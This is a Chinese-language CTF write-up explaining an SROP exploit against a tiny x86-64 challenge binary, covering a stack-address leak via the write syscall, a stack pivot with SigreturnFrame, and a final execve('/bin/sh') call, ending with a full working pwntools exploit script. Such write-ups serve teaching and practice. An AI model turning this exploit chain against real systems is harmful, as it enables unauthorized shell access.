---
title: srop实战
authorId: hac425
tags:
  - srop
  - rop
categories:
  - ctf
date: 2017-12-16 17:36:00
---
### 前言

`srop` 的作用比较强，在条件允许的情况下，尽量使用它。题目来自于 `i春秋`的一个比赛。


题目链接：
https://gitee.com/hac425/blog_data/blob/master/smallest
### 正文

程序非常的简单

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1513417180656goqrxx0p.png?imageslim)
使用 `syscall` 进行系统调用，往 `rsp` 读入数据，然后 `ret`, 直接就可以控制 `rip`. 

程序非常的小，除了 这里基本没有代码，但是我们有 `syscall` ，`srop`利用之。首先明确目标。

```
execve(“/bin/sh”, 0, 0)
```
`syscall` 的传参顺序为 

```
rdi,rsi,rdx,rcx,r8, r9
```
然后 `rax` 存放 系统调用号 以及 `syscall` 的返回值。
所以我们需要设置 

```
rax=59
rdi---> /bin/sh
rsi=0
rdx=0
```
然后 `syscall`.就可以拿到 `shell` 了。

使用 `srop` 我们可以控制所有的寄存器的值。
所以我们需要一个可写的地址在一次`srop`结束后设置为 `rsp`.

**下面根据 `exp` 进行讲解**

首先是通过栈中环境变量，泄露栈的地址，得到一个可写的地址，用于 `srop` 时设置 `rsp`.


因为 `write` 的系统调用号 为 `1`,  而且 `stdout` 也为 `1`, 这样我们输入一个字符。然后通过 `rop` 跳到

```
mov     rdi, rax        ; fd
syscall 
```

我们就能 调用 `write(1,rsi,rdx)`, 此时的 `rsi` 就是栈的地址，`rdx` 则为 `0x400`,我们就能 拿到 栈的地址。

有一点需要注意的是，我们需要事先布置好栈数据，然后再次进入 `start`, 控制 `rax`.因为我们要控制的 `rax` 值小于 我们需要布置的数据的长度。


```
again = 0x4000B0         #xor     rax, rax
rdi_rsi_sys = 0x04000BB  # mov     rdi, rax

payload = p64(again)
payload += p64(rdi_rsi_sys)
payload += p64(again)  # addr for after leak

p.send(payload)
sleep(0.2)

log.info("set stack for call write(1,....)")
# pause()

p.send('\xbb')
data = p.recv()
sleep(0.2)

stack_addr = u64(data[0x10:0x18]) - 0x253
log.info(hex(stack_addr))

log.info("set rax=1, and ret to rdi_rsi_sys to call write(1,....)")
```
然后就是 `srop` 了。首先使用 `srop` 修改 `rsp`到 我们 一个刚刚泄露的地址.设置好 `/bin/sh`, 这么做的原因是，在一个确定地址处设置好 `/bin/sh`，用于后面 `getshell`.

![paste image](http://oy9h5q2k4.bkt.clouddn.com/15134185188140sj1uelb.png?imageslim)

然后又回到开头，设置 `SigreturnFrame`, 此时已经可以确定`/bin/sh` 的地址了。设置好 寄存器。`srop`之后，再次 `syscall` 执行 
`execve(“/bin/sh”, 0, 0)`

![paste image](http://oy9h5q2k4.bkt.clouddn.com/15134185607335pktg6kj.png?imageslim)




### 最后


很多东西调试一遍就清楚了。调试 `exp`, 写一点就调试一点。`srop` 时 ,栈顶开始为 `SigreturnFrame`.


参考：

http://blog.csdn.net/qq_29343201/article/details/72627439

完整的 `exp`

```
from pwn import *
from time import sleep
context(os='linux', arch='amd64', log_level='debug')

p = process("./smallest")



# gdb.attach(p, '''
# bp *0x004000BE 

# 	''')
pause()


again = 0x4000B0         #xor     rax, rax
rdi_rsi_sys = 0x04000BB  # mov     rdi, rax

payload = p64(again)
payload += p64(rdi_rsi_sys)
payload += p64(again)  # addr for after leak

p.send(payload)
sleep(0.2)

log.info("set stack for call write(1,....)")
# pause()

p.send('\xbb')
data = p.recv()
sleep(0.2)

stack_addr = u64(data[0x10:0x18]) - 0x253
log.info(hex(stack_addr))

log.info("set rax=1, and ret to rdi_rsi_sys to call write(1,....)")



# pause()


# swtch rsp ---> to leak addr, for get /bin/sh addr

frame = SigreturnFrame()
frame.rsp = stack_addr # after sigretrun, rsp
frame.rip = again    # ret to begin
payload = p64(again)
payload += 'd' * 8
payload += str(frame)

sleep(0.2)
p.send(payload)


syscall_addr = 0x04000BE 

payload = p64(syscall_addr)
payload += '\x11' * (15 - len(payload))

pause()
sleep(0.2)
p.send(payload)

log.info("switch stack done")
pause()

payload = p64(again)
payload += "B" * 8

frame = SigreturnFrame()
frame.rsp = stack_addr # after sigretrun, rsp
frame.rip = syscall_addr    # ret to begin

frame.rax = 59

frame.rdi = stack_addr + 0x10 + 0xf8

payload += str(frame)
payload += "/bin/sh\x00"

p.send(payload)
pause()



payload = p64(syscall_addr)
payload += '\x11' * (15 - len(payload))
p.send(payload)

p.interactive()

```